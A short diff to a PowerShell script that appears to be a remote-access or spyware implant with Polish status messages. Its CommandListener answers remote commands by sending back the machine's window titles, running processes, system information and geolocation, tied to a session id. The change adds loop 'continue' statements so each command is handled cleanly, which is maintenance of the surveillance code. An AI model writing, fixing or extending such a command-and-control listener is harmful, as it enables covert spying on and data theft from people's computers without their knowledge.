@@ -168,12 +168,12 @@ function CommandListener {
                     continue
                 }
 
-                if ($text -match "/online")   { SendMessage "Sesja aktywna" $text }
+                if ($text -match "/online")   { SendMessage "Sesja aktywna" $text; continue }
                 if ($text -match "/exit")     { SendMessage "Sesja zakończona" $text; exit }
-                if ($text -match "/windows")  { $titles = Get-WindowTitles | Out-String; SendMessage $titles $text }
-                if ($text -match "/plist")    { $plist = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU | Format-Table -AutoSize | Out-String; SendMessage $plist $text }
-                if ($text -match "/sysinfo")  { $sysinfo = Get-SystemInfo; SendMessage $sysinfo $text }
-                if ($text -match "/geoloc")   { $geo = Get-GeoLocation; SendMessage $geo $text }
+                if ($text -match "/windows")  { $titles = Get-WindowTitles | Out-String; SendMessage $titles $text; continue }
+                if ($text -match "/plist")    { $plist = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU | Format-Table -AutoSize | Out-String; SendMessage $plist $text; continue }
+                if ($text -match "/sysinfo")  { $sysinfo = Get-SystemInfo; SendMessage $sysinfo $text; continue }
+                if ($text -match "/geoloc")   { $geo = Get-GeoLocation; SendMessage $geo $text; continue }
 
                 if ($sid[0] -notmatch $session_id) { continue }
 
